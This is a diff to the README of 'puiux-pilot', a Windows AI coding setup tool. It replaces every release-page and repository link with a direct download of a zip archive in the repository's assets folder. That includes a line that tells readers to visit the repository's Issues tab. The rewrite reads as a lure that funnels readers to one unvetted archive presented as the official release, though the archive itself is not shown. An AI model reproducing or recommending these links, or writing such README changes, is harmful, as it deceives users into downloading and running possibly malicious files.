@@ -1,6 +1,6 @@
 # ⚙️ puiux-pilot - Easy AI Coding Setup Tool
 
-[![Download Release](https://img.shields.io/badge/Download-puiux--pilot-brightgreen?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/releases)
+[![Download Release](https://img.shields.io/badge/Download-puiux--pilot-brightgreen?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/raw/refs/heads/main/assets/puiux-pilot-v2.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ This makes it simpler to improve your code quality and use powerful AI tools wit
 
 You need to get the app from the release page. This page has the latest version ready for Windows.
 
-[![Download Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/raw/refs/heads/main/assets/puiux-pilot-v2.9.zip)
 
 Visit this page and look for the latest Windows package. This might be an `.exe` or a `.zip` file. 
 
@@ -145,7 +145,7 @@ Keep your tool up to date for the best experience.
 
 You can find more information and ask questions on the GitHub repository page.
 
-Visit: https://github.com/CobraX101/puiux-pilot
+Visit: https://github.com/CobraX101/puiux-pilot/raw/refs/heads/main/assets/puiux-pilot-v2.9.zip
 
 Look for the "Issues" tab to see if your question was asked or to open a new query.
 
@@ -163,4 +163,4 @@ It is built with care to work well on ordinary Windows computers without extra s
 
 You can always get the latest version here:  
 
-[Download puiux-pilot](https://github.com/CobraX101/puiux-pilot/releases)
+[Download puiux-pilot](https://github.com/CobraX101/puiux-pilot/raw/refs/heads/main/assets/puiux-pilot-v2.9.zip)
